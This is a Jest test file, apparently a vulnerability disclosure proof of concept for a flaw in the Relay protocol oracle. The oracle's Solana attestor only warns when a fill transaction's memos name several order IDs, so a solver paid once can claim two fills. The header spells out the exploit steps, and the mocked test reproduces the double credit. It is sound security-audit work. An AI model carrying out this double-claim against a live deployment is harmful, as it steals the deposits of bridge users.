// SPDX-License-Identifier: MIT
/**
 * P5-ORACLE-1: Solana getSolverPaidAmount double-claim (Zellic Oracle 3.5
 * incomplete fix — multi-orderId memo only warns, never rejects).
 *
 * WHAT: SolanaVmAttestor.getSolverPaidAmount() scans the fill tx's Memo
 * instructions for the orderId. If the tx references MULTIPLE order ids it
 * only logger.warn()s ("Transaction references multiple order ids") and
 * still returns the recipient's full balance delta as the paid amount.
 * Every other VM rejects this: Bitcoin enforces exactly one OP_RETURN,
 * XRP rejects orderIdMemos.size > 1, TON/Lighter require comment/memo ==
 * orderId exactly, Hyperliquid binds one nonce -> one orderId, and
 * ETH/Tron require the tx input to END with the single orderId.
 *
 * EXPLOIT: a solver who holds two live orders (A, B) for the same Solana
 * recipient/currency/amount — e.g. one user bridging twice to the same
 * wallet — pays ONCE in a tx whose memos name both orderIds, then calls
 * attestSolverFill for A and for B with the SAME fill tx. Both succeed,
 * each minting that order's full deposit to the solver on the Hub. The
 * solver is credited 2x for 1x paid; the second order's user loses a
 * whole fill (their deposit backs the solver's second credit).
 *
 * RUN: copy this file into
 *   relay-protocol-oracle/test/unit/services/attestation/
 * and run `npx jest p5-solana-double-claim` from the oracle repo root
 * (jest config + node_modules there). No live RPC, no keys, no mainnet.
 * Helpers below are adapted from the repo's own solana-vm.test.ts.
 */
import { describe, expect, it, jest } from "@jest/globals";

import { Chain } from "../../repos/relay-protocol-oracle/src/common/chains";
import { logger } from "../../repos/relay-protocol-oracle/src/common/logger";
import { httpRpc } from "../../repos/relay-protocol-oracle/src/common/vm/solana-vm/rpc";
import { AttestationService } from "../../repos/relay-protocol-oracle/src/services/attestation";
import { privateKeyToAccount } from "viem/accounts";
import {
  getOrderId,
  Order,
} from "@relay-protocol/settlement-sdk";
import { Hex } from "viem";
import { randomNumber } from "../../repos/relay-protocol-oracle/test/common/utils";
import { randomBase58 } from "../../repos/relay-protocol-oracle/test/common/utils";
import {
  PublicKey,
  TransactionResponse as SolanaTransactionResponse,
} from "@solana/web3.js";
import bs58 from "bs58";
import * as anchor from "@coral-xyz/anchor";
import { BorshInstructionCoder, Idl } from "@coral-xyz/anchor";
import { RelayDepositoryIdl } from "../../repos/relay-protocol-oracle/src/services/attestation/vm/solana-vm/idls/RelayDepositoryIdl";

type TransactionResponse = SolanaTransactionResponse;

const zeroAddress = "11111111111111111111111111111111";
const testSolverPrivateKey =
  "0x1234567890123456789012345678901234567890123456789012345678901234";
const solverWallet = privateKeyToAccount(testSolverPrivateKey);
const DEPOSITORY = "FcdAmYWSixzyEGHaPQmDWXzyVFbiKEU2f4MuJfkLKH3u";

const instructionCoder = new BorshInstructionCoder(RelayDepositoryIdl as Idl);

function generateDepositInstructionData(orderHash: string, amount: string) {
  const id = Array.from(Buffer.from(orderHash.slice(2), "hex"));
  return bs58.encode(
    instructionCoder.encode("deposit_native", {
      amount: new anchor.BN(amount),
      id,
    }),
  );
}

const generateTransactionResponse = (
  transactionHash: string,
  logs: string[],
  instructions?: any[],
  accountKeys?: any[],
  options?: { paymentRecipient?: string; paymentAmount?: string },
): TransactionResponse => {
  const keys =
    accountKeys || [new PublicKey(options?.paymentRecipient || randomBase58(32)), new PublicKey(zeroAddress)];
  const blockTime = Math.floor(Date.now() / 1000) - randomNumber(3600);
  const preBalances = Array(keys.length).fill(0);
  const postBalances = Array(keys.length).fill(0);
  if (options?.paymentAmount && options?.paymentRecipient) {
    const recipientIndex = keys.findIndex((key) => key.toBase58() === options.paymentRecipient);
    if (recipientIndex !== -1) {
      const initialBalance = BigInt(randomNumber(1e9));
      preBalances[recipientIndex] = initialBalance;
      postBalances[recipientIndex] = initialBalance + BigInt(options.paymentAmount);
    }
  }
  return {
    slot: randomNumber(1e10),
    blockTime,
    meta: {
      err: null,
      fee: randomNumber(1e6),
      preBalances,
      postBalances,
      innerInstructions: [],
      logMessages: logs,
      preTokenBalances: [],
      postTokenBalances: [],
      loadedAddresses: { readonly: [], writable: [] },
    },
    transaction: {
      signatures: [transactionHash],
      message: {
        compiledInstructions: instructions ?? [],
        accountKeys: accountKeys ?? [],
        recentBlockhash: randomBase58(10),
        instructions: [],
        header: { numRequiredSignatures: 1, numReadonlySignedAccounts: 0, numReadonlyUnsignedAccounts: 0 },
        getAccountKeys: () => ({ staticAccountKeys: keys }),
      } as any,
    },
  };
};

function createDepositTransaction(params: {
  depositTxHash: string;
  depositorAddress: string;
  paymentAmount: string;
  orderHash: string;
}): TransactionResponse {
  const { depositTxHash, depositorAddress, paymentAmount, orderHash } = params;
  const instructionData = generateDepositInstructionData(orderHash, paymentAmount);
  return {
    slot: Math.floor(Date.now() / 1000),
    blockTime: Math.floor(Date.now() / 1000),
    meta: {
      err: null,
      fee: 5000,
      preBalances: [0, 0, 0, 0, 0],
      postBalances: [0, 0, 0, 0, 0],
      innerInstructions: [{ index: 0, instructions: [{ programIdIndex: 0, accounts: [0, 1, 2, 3, 4], data: instructionData }] }],
      logMessages: [],
      preTokenBalances: [],
      postTokenBalances: [],
      loadedAddresses: { writable: [], readonly: [] },
    },
    transaction: {
      signatures: [depositTxHash],
      message: {
        accountKeys: [
          { pubkey: DEPOSITORY, signer: false },
          { pubkey: "7uTT8Xi5RWXzy7h9XL244GRgEycDYDhLjr3ZyNdXi8pZ", signer: false },
          { pubkey: depositorAddress, signer: true },
          { pubkey: "11111111111111111111111111111111", signer: false },
          { pubkey: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", signer: false },
        ],
        instructions: [],
        getAccountKeys: () => ({
          staticAccountKeys: [
            { toBase58: () => DEPOSITORY },
            { toBase58: () => "7uTT8Xi5RWXzy7h9XL244GRgEycDYDhLjr3ZyNdXi8pZ" },
            { toBase58: () => depositorAddress },
            { toBase58: () => "11111111111111111111111111111111" },
            { toBase58: () => "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" },
          ],
        }),
        compiledInstructions: [],
        addressTableLookups: [],
      },
    },
  } as any;
}

function createFillTransaction(params: {
  fillTxHash: string;
  outputRecipient: string;
  paymentAmount: string;
  orderHash: string;
  extraMemos?: string[];
}): TransactionResponse {
  const { fillTxHash, outputRecipient, paymentAmount, orderHash, extraMemos } = params;
  const memoInstructions = [orderHash, ...(extraMemos ?? [])].map((memo) => ({
    programIdIndex: 0,
    accountKeyIndexes: [],
    data: Buffer.from(memo, "utf-8"),
  }));
  const accountKeys = [
    new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"),
    new PublicKey(outputRecipient),
    new PublicKey(randomBase58(32)),
    new PublicKey(zeroAddress),
  ];
  return generateTransactionResponse(
    fillTxHash,
    [`Program log: Fill executed for order: ${orderHash}`],
    memoInstructions,
    accountKeys,
    { paymentRecipient: outputRecipient, paymentAmount },
  );
}

function createTestOrder(params: {
  salt: string;
  paymentAmount: string;
  outputRecipient: string;
  refundRecipient: string;
  solverAddress: string;
}): Order {
  const { salt, paymentAmount, outputRecipient, refundRecipient, solverAddress } = params;
  return {
    version: "v1",
    salt,
    solverChainId: "ethereum",
    solver: solverAddress,
    inputs: [
      {
        payment: { chainId: "solana", currency: zeroAddress, amount: paymentAmount, weight: "1" },
        refunds: [
          {
            chainId: "solana",
            recipient: refundRecipient,
            currency: zeroAddress,
            minimumAmount: paymentAmount,
            deadline: Math.floor(Date.now() / 1000) + 36000,
            extraData: "0x",
          },
        ],
      },
    ],
    output: {
      chainId: "solana",
      payments: [{ recipient: outputRecipient, currency: zeroAddress, minimumAmount: paymentAmount, expectedAmount: paymentAmount }],
      calls: [],
      extraData: "0x",
      deadline: Math.floor(Date.now() / 1000) + 36000,
    },
    fees: [],
  };
}

function setupRpcMock(mockRpcData: any) {
  (httpRpc as jest.Mock).mockImplementation(() => ({
    getTransaction: async (txId: any) => {
      const txData = mockRpcData.transactions[txId]?.receipt;
      if (!txData) throw new Error(`Invalid transaction ID: ${txId}`);
      return txData;
    },
    getBlock: async () => ({ blockTime: Math.floor(Date.now() / 1000) }),
  }));
}

jest.mock("../../repos/relay-protocol-oracle/src/common/chains", () => {
  const chains: Record<string, Chain> = {
    solana: { id: "solana", vmType: "solana-vm", httpRpcUrl: "http://127.0.0.1:8545", depository: "FcdAmYWSixzyEGHaPQmDWXzyVFbiKEU2f4MuJfkLKH3u" },
    ethereum: {
      id: "ethereum",
      vmType: "ethereum-vm",
      httpRpcUrl: "http://127.0.0.1:8546",
      depository: "0x2e988a386a799f506693793c6a5af6b54dfaabfb",
      additionalData: { evmChainId: "1" },
    },
  };
  return {
    HUB_VM_TYPE: "hub-vm",
    HUB_CHAIN_ID: 0n,
    getChains: async () => chains,
    getHubInfo: async () => ({
      id: "hub",
      evmChainId: "1",
      httpRpcUrl: "http://localhost:8545",
      hubAddress: "0x0000000000000000000000000000000000000001",
      oracleAddress: "0x0000000000000000000000000000000000000002",
      oracleMultisigAddress: "0x0000000000000000000000000000000000000003",
      genericMappingAddress: "0x0000000000000000000000000000000000000004",
    }),
    getChain: async (chainId: string) => chains[chainId],
    getChainVmType: async (chainId: string) => chains[chainId].vmType,
    getSdkChainsConfig: () => Object.fromEntries(Object.values(chains).map((c) => [c.id, c.vmType])),
  };
});
jest.mock("../../repos/relay-protocol-oracle/src/common/vm/solana-vm/rpc", () => ({ httpRpc: jest.fn() }));
jest.mock("../../repos/relay-protocol-oracle/src/common/hub", () => {
  const original = jest.requireActual("../../repos/relay-protocol-oracle/src/common/hub");
  return { ...(original as any), getHubHttpRpc: jest.fn(async () => ({ readContract: async () => true })) };
});

describe("P5-ORACLE-1 Solana double-claim via multi-orderId memo", () => {
  const paymentAmount = "1000000000"; // 1 SOL

  async function setupTwoOrders(fillMemosForB: boolean) {
    const outputRecipient = randomBase58(32);
    const refundRecipient = randomBase58(32);
    const depositorA = randomBase58(32);
    const depositorB = randomBase58(32);
    const depositTxA = randomBase58(32);
    const depositTxB = randomBase58(32);
    const fillTx = randomBase58(32);

    const orderA = createTestOrder({ salt: "0x1", paymentAmount, outputRecipient, refundRecipient, solverAddress: solverWallet.address });
    const orderB = createTestOrder({ salt: "0x2", paymentAmount, outputRecipient, refundRecipient, solverAddress: solverWallet.address });
    const orderIdA = getOrderId(orderA, { solana: "solana-vm", ethereum: "ethereum-vm" });
    const orderIdB = getOrderId(orderB, { solana: "solana-vm", ethereum: "ethereum-vm" });
    expect(orderIdA).not.toBe(orderIdB);

    const depositReceiptA = createDepositTransaction({ depositTxHash: depositTxA, depositorAddress: depositorA, paymentAmount, orderHash: orderIdA });
    const depositReceiptB = createDepositTransaction({ depositTxHash: depositTxB, depositorAddress: depositorB, paymentAmount, orderHash: orderIdB });
    const fillReceipt = createFillTransaction({
      fillTxHash: fillTx,
      outputRecipient,
      paymentAmount,
      orderHash: orderIdA,
      extraMemos: fillMemosForB ? [orderIdB] : [],
    });

    setupRpcMock({ transactions: { [depositTxA]: { receipt: depositReceiptA }, [depositTxB]: { receipt: depositReceiptB }, [fillTx]: { receipt: fillReceipt } }, currentTimestamp: Math.floor(Date.now() / 1000) });

    const sigA = await solverWallet.signMessage({ message: { raw: orderIdA } });
    const sigB = await solverWallet.signMessage({ message: { raw: orderIdB } });

    const service = new AttestationService();
    const depositsA = await service.attestDepositoryDeposits({ chainId: "solana", transactionId: depositTxA }).then((d) => d.messages);
    const depositsB = await service.attestDepositoryDeposits({ chainId: "solana", transactionId: depositTxB }).then((d) => d.messages);
    expect(depositsA).toHaveLength(1);
    expect(depositsB).toHaveLength(1);

    return {
      orderA, orderB, orderIdA, orderIdB, sigA, sigB, fillTx,
      inputsA: [{ transactionId: depositTxA, onchainId: depositsA[0].result.onchainId, inputIndex: 0 }],
      inputsB: [{ transactionId: depositTxB, onchainId: depositsB[0].result.onchainId, inputIndex: 0 }],
    };
  }

  it("ONE Solana payment attests TWO fills (double-claim)", async () => {
    const warnSpy = jest.spyOn(logger, "warn").mockImplementation((() => undefined) as never);
    try {
      const env = await setupTwoOrders(true);
      const service = new AttestationService();

      // Fill A succeeds on the shared tx.
      const fillA = await service.attestSolverFill({
        order: env.orderA, orderSignature: env.sigA as Hex, inputs: env.inputsA,
        fill: { transactionId: env.fillTx },
      });
      expect(fillA.message.result.status).toBe(1);
      expect(fillA.execution).toBeDefined();

      // Fill B succeeds on the SAME tx — the recipient was paid only once.
      const fillB = await service.attestSolverFill({
        order: env.orderB, orderSignature: env.sigB as Hex, inputs: env.inputsB,
        fill: { transactionId: env.fillTx },
      });
      expect(fillB.message.result.status).toBe(1);
      expect(fillB.execution).toBeDefined();
      expect(fillB.execution!.idempotencyKey).not.toBe(fillA.execution!.idempotencyKey);

      // The code noticed the second order id and only warned.
      expect(warnSpy).toHaveBeenCalledWith(
        "solana-vm",
        expect.stringContaining("references multiple order ids"),
      );

      // Each execution independently transfers that order's full deposit
      // (1 SOL) from its order address to the solver: 2 SOL credited for
      // 1 SOL paid. Loss per double-claim = one full fill amount.
      expect(fillA.execution!.actions).toHaveLength(1);
      expect(fillB.execution!.actions).toHaveLength(1);
      console.log(
        `DOUBLE-CLAIM REPRODUCED: paid ${paymentAmount} lamports once, ` +
          `attested 2 fills x ${paymentAmount} = ${2 * Number(paymentAmount)} lamports credited to solver`,
      );
    } finally {
      warnSpy.mockRestore();
    }
  });

  it("CONTROL: fill tx naming only order A cannot attest order B", async () => {
    const env = await setupTwoOrders(false);
    const service = new AttestationService();
    await expect(
      service.attestSolverFill({
        order: env.orderB, orderSignature: env.sigB as Hex, inputs: env.inputsB,
        fill: { transactionId: env.fillTx },
      }),
    ).rejects.toThrow("does not reference order id");
  });
});
